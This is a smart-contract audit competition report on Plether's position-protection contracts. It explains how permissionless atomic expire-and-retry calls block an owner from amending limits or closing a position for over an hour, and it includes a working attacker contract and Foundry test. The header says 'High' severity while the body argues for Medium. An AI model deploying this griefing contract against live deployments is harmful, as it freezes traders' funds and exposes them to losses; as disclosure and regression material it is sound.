# \#97992 [SC-High] Permissionless atomic protection retries censor the owner's MED-9 limit amendment and freeze the position for over one hour

**Submitted on Nov 4th 2026 at 09:00:14 UTC by @JAO for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97992
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour

## Description

## Summary

The MED-9 remediation preserves the owner’s financial ceilings across protection-close retries and allows those ceilings to be amended only while the protection is `Latched`. However, retries are permissionless.

An unprivileged attacker can atomically terminalize the current protection-close attempt and immediately retry it in the same transaction. Consequently, the intermediate `Latched` state is never externally available to the owner.

The attacker can repeat this process whenever the replacement order expires, continuously installing fresh protection-close orders with the same stale financial limits. During the attack, the owner cannot amend the limits, cancel the protection, use the atomic cancel-and-close path, or submit a manual close.

This keeps the protected position and its funds locked and exposed to market movement for an attacker-controlled period. The validated reproduction sustains the condition for more than one hour.

## Vulnerability Description

The vulnerability results from the unsafe combination of two individually intentional properties:

1. The owner may amend retained protection-close limits only while the protection is `Latched` and the account has no pending order.
2. Any address may permissionlessly consume that `Latched` state by retrying the protection close.

At the scoped commit, `amendLatchedPositionProtectionCloseLimits` rejects any state other than `Latched` and also rejects amendment while the account has a pending order:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L327

By contrast, `retryPositionProtectionClose` is permissionless. It accepts a `Latched` protection, creates a new close order and records the replacement attempt:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L405

A failed protection-close attempt transitions from `Triggered` to `Latched` through `handleFailedProtectionAttempt`:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L667

The subsequent retry transitions the protection from `Latched` back to `Triggered` through `_recordCloseAttempt`:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L577

Because both public operations can be called by one attacker contract, the attacker can execute the failing close and retry it atomically. The protection is `Latched` only as an intermediate state inside the attacker’s transaction, leaving no transaction boundary at which the owner can call the amendment function.

The initial failure does not require oracle manipulation or a maliciously selected limit. A financial ceiling that was sufficient when the protection was created can become stale following normal adverse price movement. The resulting close fails with the typed `ConstraintViolation` terminal reason.

After the replacement child reaches its execution deadline, the attacker can atomically call `expireOrder` and `retryPositionProtectionClose`. The expiry relatches the protection, but the immediate retry consumes that state and creates another `Triggered` child.

The replacement request preserves the stale retained limits and receives a fresh execution window:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L655-L679

The scoped default maximum execution window is 60 seconds:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderExecutionOrchestrator.sol#L10-L14

Repeating these atomic expiry-and-retry transactions continually extends the deadline and prevents the owner from obtaining an externally usable `Latched` state.

At every post-transaction boundary during the attack:

- `amendLatchedPositionProtectionCloseLimits` reverts because the protection is already `Triggered`;
- `cancelPositionProtection` reverts because cancellation accepts only `PendingOpen` or `Armed`;
- `cancelPositionProtectionAndCommitClose` reverts because it also requires `Armed`;
- a direct manual close reverts with `OrderRouter__ProtectionActive`;
- one fresh child remains pending in the protected account’s queue;
- the child continues carrying the stale financial limits;
- the full protected position remains open and exposed.

The Router’s active-protection restriction is enforced here:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315

## Impact

The selected impact is:

**Temporary freezing of funds for at least 1 hour**

The validated reproduction demonstrates that an unprivileged attacker can keep the victim’s protected position locked for more than one hour. Throughout that period:

- the owner cannot amend the stale financial ceiling;
- the owner cannot cancel the protection;
- the owner cannot use the protection cancel-and-close operation;
- the owner cannot submit a direct manual close;
- the account’s pending-order queue remains occupied;
- the entire position remains open and exposed to additional price movement and liquidation risk.

The attacker does not need to obtain a direct financial profit. The attack is an active griefing strategy in which the attacker repeatedly pays gas to deny the owner access to every available recovery path.

This report does not claim theft, permanent freezing or High severity. If the attacker stops retrying, the owner can expire the final child, restore the `Latched` state and amend the limits. The demonstrated impact is therefore a repeatable temporary freeze exceeding one hour.

## Likelihood

The attack has realistic prerequisites:

1. A trader has an active triggered take-profit or stop-loss protection.
2. A retained financial ceiling that was valid when selected becomes too restrictive following normal market movement.
3. The protection-close attempt consequently fails with `ConstraintViolation`.
4. An unprivileged attacker or keeper observes the order and submits the atomic failure-and-retry transaction.
5. The attacker repeats the atomic expiry-and-retry transaction after each new deadline.

No privileged role, compromised key, oracle corruption or modification of the owner’s selected limits is required.

The critical state transitions are atomic. There is no mempool interval in which the owner can insert an amendment transaction between the close failure or expiry and the attacker’s retry.

The attacker must continue paying gas and obtain transaction inclusion after each deadline. The attack ends when retries cease. These constraints support Medium severity rather than a permanent or High-severity classification.

## Distinction from MED-9

Cecuro MED-9 reported that protection closes and permissionless retries did not preserve trader-selected financial limits. Its remediation:

- stores the owner’s financial ceilings;
- copies them into the initial close and subsequent retries; and
- provides an owner-only amendment function while the protection is `Latched`.

This finding does not allege that a keeper can loosen or bypass those limits. The limits remain preserved exactly.

The new issue is that the recovery mechanism introduced for stale limits is available only in `Latched`, while a permissionless caller can atomically consume that state by retrying. The attacker weaponizes the retained stale ceiling to ensure that the child cannot close and then censors the owner’s MED-9 amendment window.

This is therefore an incomplete MED-9 remediation and a distinct vulnerability in the scoped commit, rather than a restatement of the original MED-9 issue.

The referenced audit report is:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf

## Distinction from Documented Limitations

`packages/perps/SECURITY.md` documents that failed protection-attempt cleanup is unpaid, that each retry creates a fresh zero-bounty close record and that operators should alert on a prolonged `Latched` state without a live child:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md

This vulnerability is not merely unpaid cleanup or expected retry behavior.

After every attacker transaction, the protection is `Triggered` and has a live child. The attack therefore avoids the documented alert condition: there is no prolonged `Latched` state and no absence of a child.

The security impact is the permissionless censorship of the owner’s only limit-amendment window, combined with an occupied queue and a position that the owner cannot close.

## Recommendation

The owner must have a recovery mechanism that cannot be censored by a permissionless retry.

A minimal robust remediation is to permit the owner to amend the retained close limits while the protection is `Triggered` as well as `Latched`. An amendment made while a child is live can update the retained limits used by the next protection attempt without modifying the immutable policy of the already-registered child.

After the current child fails or expires, any subsequent permissionless retry would then copy the repaired owner limits.

Additional defense-in-depth measures include:

- introducing an owner-priority grace period after relatching before permissionless retries become available;
- providing an owner-only atomic amend-and-retry function;
- allowing an owner-authorized terminalization-and-replacement flow for a live stale child;
- monitoring repeated `Triggered` child replacements and deadline extensions, rather than monitoring only prolonged `Latched` states without a child.

Regression coverage should include an adversarial contract that combines failure or expiry with retry in a single transaction and should verify that the owner retains a usable mechanism to update the limits applied to the next child.

## Proof of Concept

## Proof of Concept

The PoC modifies only the existing test file:

`packages/perps/test/perps/spec/trader/PositionProtection.t.sol`

It adds an unprivileged attacker contract that performs the vulnerable operations atomically and a regression test named:

`test_PermissionlessRetryCanAtomicallyBlockOwnerLimitAmendment`

### What the PoC demonstrates

The test performs the following steps:

1. Opens a long position for the victim.
2. Creates stop-loss protection with an execution-notional ceiling that is sufficient at the initial mark price.
3. Moves the market to the stop-loss price. This ordinary adverse movement makes the retained notional ceiling stale.
4. Uses an unprivileged attacker contract to execute the protection close and call `retryPositionProtectionClose` in the same transaction.
5. Confirms that the initial close fails with `ConstraintViolation`.
6. Confirms that the protection is already `Triggered` again when the attacker transaction ends, leaving no externally usable `Latched` state.
7. Confirms that the owner cannot:
   - amend the stale limits;
   - cancel the protection;
   - use `cancelPositionProtectionAndCommitClose`; or
   - submit a manual close.
8. Waits until each replacement child reaches its execution deadline.
9. Atomically calls `expireOrder` and `retryPositionProtectionClose` after every deadline.
10. Repeats this process until more than one hour has elapsed.
11. Confirms that:
    - every retry creates a fresh child and deadline;
    - the original stale limits remain unchanged;
    - the account queue remains occupied;
    - the protection remains `Triggered`; and
    - the complete position remains open.
12. Stops the attacker as a control, expires the last child and confirms that the owner can finally amend the limits once the protection remains `Latched`.

### Reproduction steps

1. Clone the scoped repository and check out the exact scoped commit:

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
```

2. Apply the following patch:

```diff
diff --git a/packages/perps/test/perps/spec/trader/PositionProtection.t.sol b/packages/perps/test/perps/spec/trader/PositionProtection.t.sol
index f16fde7a..06ed626e 100644
--- a/packages/perps/test/perps/spec/trader/PositionProtection.t.sol
+++ b/packages/perps/test/perps/spec/trader/PositionProtection.t.sol
@@ -24,6 +24,40 @@ import {MockPyth} from "@plether/test-utils/MockPyth.sol";
 import {StdStorage, stdStorage} from "forge-std/StdStorage.sol";
 import {Vm} from "forge-std/Vm.sol";
 
+contract ProtectionRetryGriefer {
+
+    function executeAndRetry(
+        address router,
+        address protectionBook,
+        uint64 orderId,
+        uint64 protectionId,
+        bytes[] calldata pythUpdateData
+    ) external returns (uint64 linkedOrderId) {
+        (bool executed, bytes memory returnData) =
+            router.call(abi.encodeWithSignature("executeOrder(uint64,bytes[])", orderId, pythUpdateData));
+        require(executed, "execution failed");
+        OrderV3Types.ExecutionResult memory result = abi.decode(returnData, (OrderV3Types.ExecutionResult));
+        require(
+            result.status == OrderV3Types.LifecycleStatus.Failed
+                && result.terminalReason == OrderV3Types.TerminalReason.ConstraintViolation,
+            "unexpected terminal result"
+        );
+        linkedOrderId = IPositionProtectionActions(protectionBook).retryPositionProtectionClose(protectionId);
+    }
+
+    function expireAndRetry(
+        address router,
+        address protectionBook,
+        uint64 orderId,
+        uint64 protectionId
+    ) external returns (uint64 linkedOrderId) {
+        (bool expired,) = router.call(abi.encodeWithSignature("expireOrder(uint64)", orderId));
+        require(expired, "expiry failed");
+        linkedOrderId = IPositionProtectionActions(protectionBook).retryPositionProtectionClose(protectionId);
+    }
+
+}
+
 contract PositionProtectionTest is BasePerpTest {
 
     using stdStorage for StdStorage;
@@ -1004,6 +1038,143 @@ contract PositionProtectionTest is BasePerpTest {
         assertEq(remainingSize, 0, "amended retry must close the protected position");
     }
 
+    function test_PermissionlessRetryCanAtomicallyBlockOwnerLimitAmendment() public {
+        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
+        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
+        uint256 initiallySufficientNotionalLimit = (POSITION_SIZE * MARK_PRICE) / 1e20;
+        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
+            maxExecutionNotionalAssets: initiallySufficientNotionalLimit,
+            maxGrossAccountDebitAssets: type(uint256).max,
+            maxActionChargeAssets: type(uint256).max,
+            maxExplicitFeesAssets: type(uint256).max
+        });
+
+        vm.prank(ALICE);
+        uint64 protectionId = protectionActions.createPositionProtection(params);
+        uint64 firstOrderId = _triggerAt(protectionId, LONG_STOP_LOSS);
+        _assertPendingCloseLimits(firstOrderId, params.closeLimits);
+
+        uint256 adverseNotionalAssets = (POSITION_SIZE * LONG_STOP_LOSS) / 1e20;
+        assertGt(adverseNotionalAssets, initiallySufficientNotionalLimit, "normal adverse mark makes limit stale");
+
+        ProtectionRetryGriefer griefer = new ProtectionRetryGriefer();
+        uint256 lockStartedAt = vm.getBlockTimestamp();
+        uint64 liveOrderId = griefer.executeAndRetry(
+            address(router),
+            address(protectionBook),
+            firstOrderId,
+            protectionId,
+            _mockPythUpdateData(LONG_STOP_LOSS)
+        );
+
+        OrderV3Types.TerminalOutcome memory firstOutcome = router.lifecycleBook().terminalOutcome(firstOrderId);
+        assertEq(
+            uint8(firstOutcome.status),
+            uint8(OrderV3Types.LifecycleStatus.Failed),
+            "stale-limit attempt must terminalize before the permissionless retry"
+        );
+        assertEq(
+            uint8(firstOutcome.reason),
+            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
+            "naturally stale notional limit must fail as a constraint violation"
+        );
+        assertEq(
+            uint8(protectionViews.getPositionProtection(protectionId).status),
+            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
+            "attacker execution and retry expose no inter-transaction Latched state"
+        );
+        assertEq(
+            protectionViews.getPositionProtection(protectionId).linkedOrderId,
+            liveOrderId,
+            "same attacker transaction installs the first stale-limit retry"
+        );
+        _assertOwnerRecoveryBlockedByFreshRetry(protectionId);
+        assertEq(router.pendingOrderCounts(ALICE), 1, "attacker occupies the only account queue slot");
+        _assertStoredCloseLimits(protectionId, params.closeLimits);
+
+        uint64 firstRetryDeadline = router.lifecycleBook().orderTiming(liveOrderId).executionDeadline;
+        uint256 cycles;
+        while (vm.getBlockTimestamp() - lockStartedAt <= 1 hours && cycles < 128) {
+            uint64 deadline = router.lifecycleBook().orderTiming(liveOrderId).executionDeadline;
+            vm.warp(uint256(deadline) + 1);
+            uint64 replacementOrderId =
+                griefer.expireAndRetry(address(router), address(protectionBook), liveOrderId, protectionId);
+            assertGt(replacementOrderId, liveOrderId, "each atomic cycle installs a fresh child");
+            liveOrderId = replacementOrderId;
+            ++cycles;
+        }
+
+        assertGt(
+            vm.getBlockTimestamp() - lockStartedAt,
+            1 hours,
+            "derived-deadline retries sustain the lock beyond one hour"
+        );
+        assertGt(
+            uint256(router.lifecycleBook().orderTiming(liveOrderId).executionDeadline)
+                - uint256(firstRetryDeadline),
+            1 hours,
+            "fresh child deadlines extend the lock horizon beyond one hour"
+        );
+        assertLt(cycles, 128, "deadline loop must make bounded progress");
+        assertEq(
+            uint8(protectionViews.getPositionProtection(protectionId).status),
+            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
+            "every atomic expiry and retry removes the owner amendment window"
+        );
+        assertEq(
+            protectionViews.getPositionProtection(protectionId).linkedOrderId,
+            liveOrderId,
+            "latest child remains live"
+        );
+        assertEq(router.pendingOrderCounts(ALICE), 1, "fresh live child keeps the protected account locked");
+        _assertStoredCloseLimits(protectionId, params.closeLimits);
+        _assertOwnerRecoveryBlockedByFreshRetry(protectionId);
+
+        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
+        assertEq(remainingSize, POSITION_SIZE, "victim position remains open and exposed throughout the lock");
+
+        uint64 finalDeadline = router.lifecycleBook().orderTiming(liveOrderId).executionDeadline;
+        vm.warp(uint256(finalDeadline) + 1);
+        vm.prank(ALICE);
+        router.expireOrder(liveOrderId);
+        assertEq(
+            uint8(protectionViews.getPositionProtection(protectionId).status),
+            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
+            "control: stopping attacker retries restores the owner amendment state"
+        );
+
+        PositionProtectionTypes.CloseFinancialLimits memory repairedLimits =
+            PositionProtectionTypes.CloseFinancialLimits({
+                maxExecutionNotionalAssets: type(uint256).max,
+                maxGrossAccountDebitAssets: type(uint256).max,
+                maxActionChargeAssets: type(uint256).max,
+                maxExplicitFeesAssets: type(uint256).max
+            });
+        vm.prank(ALICE);
+        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, repairedLimits);
+        _assertStoredCloseLimits(protectionId, repairedLimits);
+    }
+
+    function _assertOwnerRecoveryBlockedByFreshRetry(
+        uint64 protectionId
+    ) internal {
+        PositionProtectionTypes.CloseFinancialLimits memory amendedLimits =
+            PositionProtectionTypes.CloseFinancialLimits({
+                maxExecutionNotionalAssets: type(uint256).max,
+                maxGrossAccountDebitAssets: type(uint256).max,
+                maxActionChargeAssets: type(uint256).max,
+                maxExplicitFeesAssets: type(uint256).max
+            });
+
+        vm.prank(ALICE);
+        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
+        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amendedLimits);
+
+        vm.prank(ALICE);
+        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
+        protectionActions.cancelPositionProtection(protectionId);
+
+        OrderV3Types.OrderRequest memory manualClose = _manualCloseRequest(CfdTypes.Side.LONG);
+
+        vm.prank(ALICE);
+        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
+        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, manualClose);
+
+        vm.prank(ALICE);
+        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
+        router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);
+    }
+
     function test_RetryPositionProtectionClose_StaleOldAttemptCallbacksCannotMutateReplacement() public {
         _startRecordingLogs();
         uint64 protectionId = _createSingleLegProtection(CfdTypes.Side.LONG, LONG_TAKE_PROFIT, 0);
```

3. Run the specific PoC test:

```bash
forge test \
  --root packages/perps \
  --match-path test/perps/spec/trader/PositionProtection.t.sol \
  --match-test test_PermissionlessRetryCanAtomicallyBlockOwnerLimitAmendment \
  -vv
```

### Expected result

```text
No files changed, compilation skipped

Ran 1 test for test/perps/spec/trader/PositionProtection.t.sol:PositionProtectionTest
[PASS] test_PermissionlessRetryCanAtomicallyBlockOwnerLimitAmendment() (gas: 49104812)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 79.64ms (65.51ms CPU time)

Ran 1 test suite in 81.23ms (79.64ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The validated run confirms that permissionless atomic retries keep the protection `Triggered`, preserve the stale owner limits, block every available owner recovery operation, occupy the account queue and keep the complete position open for more than one hour.

When attacker retries stop, the control section of the test confirms that expiry restores the `Latched` state and allows the owner to amend the retained limits.
